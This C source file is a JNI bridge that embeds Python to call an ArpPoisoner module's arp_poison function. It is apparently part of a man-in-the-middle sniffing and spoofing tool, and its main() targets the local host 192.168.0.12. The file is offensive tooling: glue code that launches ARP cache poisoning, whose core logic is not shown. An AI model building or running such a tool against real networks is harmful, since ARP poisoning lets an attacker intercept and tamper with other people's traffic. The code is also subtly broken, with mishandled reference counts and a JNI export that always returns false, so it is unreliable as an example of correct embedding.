#include <stdio.h>
#include <stdbool.h>
#include <direct.h>

#include <jni.h>
#include <Python.h>

#include "net_chauhandevs_hacked_fepo_mitm_attacker_sniffing_spoofing_ArpPoisoner.h"


PyObject* ArpPoisoner;

void safeInitialize() {
	if (!Py_IsInitialized()) Py_Initialize();
}

void safeFinalize() {
	if (Py_IsInitialized()) Py_Finalize();
}

bool arp_poison(char* target_ip, char* pretend_ip) {
	safeInitialize(); //Initialize Python Interpreter

	/*Import CWD into sys.path*/
	char cwd[FILENAME_MAX];
	_getcwd(cwd, sizeof(cwd));

	PyObject* sys = PyImport_ImportModule("sys");
	PyObject* sys_path = PyObject_GetAttrString(sys, "path");
	PyList_Insert(sys_path, 0, PyUnicode_DecodeFSDefault(cwd));

	PyObject* tempArpPoisoner = PyImport_ImportModule("ArpPoisoner"); // Include the module

	if (ArpPoisoner != NULL) Py_XDECREF(tempArpPoisoner); else if (tempArpPoisoner != NULL) ArpPoisoner = tempArpPoisoner; else { printf("Need to exit!\n"); exit(1); } //Verify the module

	PyObject* func = PyObject_GetAttrString(ArpPoisoner, "arp_poison"); //Obtain function
	PyObject* args = PyTuple_Pack(2, PyUnicode_FromString(target_ip), PyUnicode_FromString(pretend_ip)); //Prepare arguments

	PyObject* boolRs = PyObject_CallObject(func, args); //Return value

	bool ret = PyObject_IsTrue(boolRs);

	Py_XDECREF(ArpPoisoner); //Remove reference
	Py_XDECREF(func); //Remove reference
	Py_XDECREF(args); //Remove reference
	Py_XDECREF(boolRs); //Remove reference

	safeFinalize(); //Finalize Interpreter

	return  ret == 1 && ret != -1 ?  JNI_TRUE: JNI_FALSE;
}

JNIEXPORT jboolean JNICALL Java_net_chauhandevs_hacked_fepo_mitm_1attacker_sniffing_1spoofing_ArpPoisoner_arp_1poison(JNIEnv* env, jclass clazz,
	jstring target_ip, jstring pretend_ip) {
	char* tip = (*env)->GetStringUTFChars(env, target_ip, 0);
	char* pip = (*env)->GetStringUTFChars(env, pretend_ip, 0);

	arp_poison(tip, pip);

	(*env)->ReleaseStringUTFChars(env, target_ip, tip);
	(*env)->ReleaseStringUTFChars(env, pretend_ip, pip);
	return JNI_FALSE;
}

int main() {
	arp_poison("192.168.0.12", "127.0.0.1");

	return 0;
}